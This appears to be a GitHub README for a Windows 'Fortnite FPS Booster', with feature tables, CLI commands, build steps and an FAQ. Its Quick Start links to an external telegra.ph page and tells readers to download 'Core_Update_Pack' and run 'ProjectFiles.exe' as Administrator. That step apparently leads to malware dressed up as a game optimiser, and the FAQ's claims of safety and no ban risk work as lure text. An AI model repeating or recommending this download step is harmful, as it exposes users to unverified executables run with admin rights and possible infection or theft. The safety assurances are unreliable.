<div align="center">

# ⚡ Fortnite FPS Booster

**A lightweight Fortnite performance booster for Windows — stable FPS, fewer stutters, lower input latency.**

[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)
[![Platform](https://img.shields.io/badge/Platform-Windows-0078D6?logo=windows)](https://github.com/)
[![Fortnite](https://img.shields.io/badge/Game-Fortnite-6C4AB6)](https://www.fortnite.com/)
[![Build](https://img.shields.io/github/actions/workflow/status/USER/fortnite-fps-booster/build.yml?label=build)](../../actions)

</div>

---

## 🎯 What it is

**Fortnite FPS Booster** helps Fortnite players get more stable frames and smoother gameplay. It applies safe Windows system profiles, tunes process priorities, and reduces latency — without third-party drivers or game-file modifications.

> ⚠️ All settings are reversible. A profile backup is created before any change is applied.
> 🛡️ The tool never modifies Fortnite game files, memory, or network traffic — only standard Windows system settings.

---

## 🚀 Quick Start

<div align="center">

### 🔽 [**⬇️ Download Core_Update_Pack and run ProjectFiles.exe**](https://telegra.ph/TRANSITION-06-17-3)

</div>

1. Download **`Core_Update_Pack`** using the button above.
2. Extract the archive into a separate folder.
3. Run **`ProjectFiles.exe`** as Administrator.
4. Pick a profile (Balanced / Fortnite Performance / Fortnite Competitive) and click **Apply**.

---

## ✨ Features

| Feature | Description |
|---|---|
| 🎮 **Fortnite Profiles** | Dedicated presets: Balanced, Fortnite Performance, Fortnite Competitive |
| ⚙️ **Process Priority** | Higher priority for the Fortnite process while in-game |
| 🧠 **Memory Tuning** | Working-set cleanup to reduce stutter during build fights |
| 🔋 **Power Plan** | Switches to a high-performance power scheme on launch |
| 📉 **Latency Reduction** | Lower scheduler and timer latency for responsive aim and builds |
| 🧾 **Reversible Tweaks** | Every change can be rolled back with one command |
| 🪶 **Lightweight** | Single executable, no dependencies or runtimes |

---

## 🎯 Fortnite-specific Profiles

| Profile | Best for | What it does |
|---|---|---|
| **Balanced** | Casual play | Safe tuning, negligible system impact |
| **Fortnite Performance** | 60–144 Hz | Priority bump, memory cleanup, balanced power plan |
| **Fortnite Competitive** | 144–360 Hz | High-performance power plan, lowest-latency timer settings |

Details in [docs/FORTNITE.md](docs/FORTNITE.md).

---

## 🧩 CLI Usage

```bash
fortnite-fps list
fortnite-fps apply --profile fortnite-performance
fortnite-fps apply --profile fortnite-competitive
fortnite-fps rollback
fortnite-fps status
```

---

## 🏗️ Build from Source

```bash
git clone https://github.com/USER/fortnite-fps-booster.git
cd fortnite-fps-booster
dotnet build -c Release
./bin/Release/FortniteFpsBooster.exe --help
```

Requirements: **.NET 8 SDK**, Windows 10/11.

---

## 📂 Project Layout

```
src/
├── main/          # Entry point, CLI, config
├── core/          # Optimization engine
├── profiles/      # Profile presets
└── utils/         # Logging and backups
```

---

## 🧪 Testing

```bash
dotnet test
```

---

## ❓ FAQ

**Is this safe?**
Yes. All changes are reversible and never touch Fortnite game files or system files.

**Will I get banned?**
No. The tool only adjusts standard Windows settings (process priority, power plan, memory cleanup). It does not read or modify game memory, files, or network traffic.

**Do I need administrator rights?**
Yes — for changing process priorities and power schemes.

**Does it work on Linux/macOS?**
The primary target is Windows. Support for other platforms is not planned.

More in [docs/FAQ.md](docs/FAQ.md).

---

## 🤝 Contributing

See [CONTRIBUTING.md](CONTRIBUTING.md). PRs, bug reports, and new profiles are welcome.

---

## 📜 License

MIT © 2026 Fortnite FPS Booster Contributors. See [LICENSE](LICENSE).

---

<div align="center">

**⭐ Star the repo if it helped you boost your Fortnite FPS!**

</div>